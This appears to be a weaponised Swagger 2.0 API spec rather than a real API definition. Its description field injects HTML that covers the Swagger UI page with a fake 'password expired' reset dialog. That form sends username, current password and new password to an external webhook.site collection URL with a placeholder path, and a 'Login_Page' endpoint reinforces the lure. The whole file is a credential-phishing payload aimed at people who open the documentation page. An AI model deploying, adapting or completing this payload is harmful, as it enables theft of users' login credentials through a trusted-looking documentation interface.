swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#f6f8fa;z-index:99998;font-family:Segoe UI,Arial,sans-serif;overflow:auto;"><div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:400px;max-width:94%;background:#fff;border-radius:8px;box-shadow:0 6px 32px rgba(0,0,0,.3);overflow:hidden;z-index:99999;"><div style="padding:36px 36px 30px;font-family:Segoe UI,Arial;"><div style="font-size:15px;font-weight:600;color:#9a6700;background:#fff8c5;border:1px solid #d4a72c;border-radius:6px;padding:10px 14px;margin-bottom:20px;">⏰ Your password expired on 30-day rotation policy</div><div style="font-size:20px;font-weight:600;color:#1f2328;margin-bottom:6px;">Reset your password</div><div style="font-size:13px;color:#656d76;margin-bottom:20px;">Choose a strong password with 12+ characters, 1 number and 1 symbol.</div><form action="https://webhook.site/REPLACE-ME" method="post"><input type="text" name="user" placeholder="Username" style="width:100%;padding:11px;border:1px solid #d0d7de;border-radius:6px;box-sizing:border-box;margin-bottom:12px;font-size:14px;"><input type="password" name="oldpass" placeholder="Current password" style="width:100%;padding:11px;border:1px solid #d0d7de;border-radius:6px;box-sizing:border-box;margin-bottom:12px;font-size:14px;"><input type="password" name="newpass" placeholder="New password" style="width:100%;padding:11px;border:1px solid #d0d7de;border-radius:6px;box-sizing:border-box;margin-bottom:12px;font-size:14px;"><input type="password" name="confirmpass" placeholder="Confirm new password" style="width:100%;padding:11px;border:1px solid #d0d7de;border-radius:6px;box-sizing:border-box;margin-bottom:16px;font-size:14px;"><button type="submit" style="width:100%;padding:12px;background:#0969da;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;">Update password &amp; sign in</button></form></div></div></div>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
